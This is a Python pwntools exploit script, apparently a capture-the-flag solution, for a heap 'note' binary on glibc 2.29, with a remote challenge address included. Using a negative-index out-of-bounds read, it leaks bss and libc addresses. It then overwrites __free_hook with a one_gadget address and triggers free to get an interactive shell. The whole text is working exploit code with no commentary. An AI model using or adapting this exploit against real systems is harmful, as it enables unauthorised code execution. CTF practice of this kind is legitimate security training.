from pwn import*
#libc 2.29
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

binary='./note.dms'
elf=ELF(binary)
debug=1
if debug:
    io=process(binary)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    gadget=[945043, 945046 ,945049 ,1093545]

else:
    io = remote("124.156.135.103",6004)
    libc=ELF('./libc.so.6')
    gadget=[926591, 926595 ,926598 ,1076984]


s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
def new(idx,size):
    ru('Choice: ')
    sl('1')
    ru('Index: ')
    sl(str(idx))
    ru('Size: ')
    sl(str(size))

def sell(idx):
    ru('Choice: ')
    sl('2')
    ru('Index: ')
    sl(str(idx))

def show(idx):
    ru('Choice: ')
    sl('3')
    ru('Index: ')
    sl(str(idx))

def edit(idx,mess):
    ru('Choice: ')
    sl('4')
    ru('Index: ')#(idx 12)
    sl(str(idx))
    ru('Message: ')
    s(mess)
def fun7(idx,mess):
    ru('Choice: ')
    sl('7')
    ru('Index: ')#(idx 12)
    sl(str(idx))
    ru('Message: ')
    s(mess)
def fun6(supe):
    ru('Choice: ')
    sl('6')
    ru('Give a super name: \n')
    sl(supe)
show(-5)
bss=u64(r(8))+0x78
print(hex(bss))
r(16)
libc.address=u64(r(8))-libc.symbols['_IO_2_1_stdout_']

print(hex(libc.address))
fun7(-5,p64(libc.symbols['__free_hook'])+p64(0x8)+p64(1))
edit(-5,p64(libc.address+gadget[3]))
sell(0)
#gdb.attach(io)
io.interactive()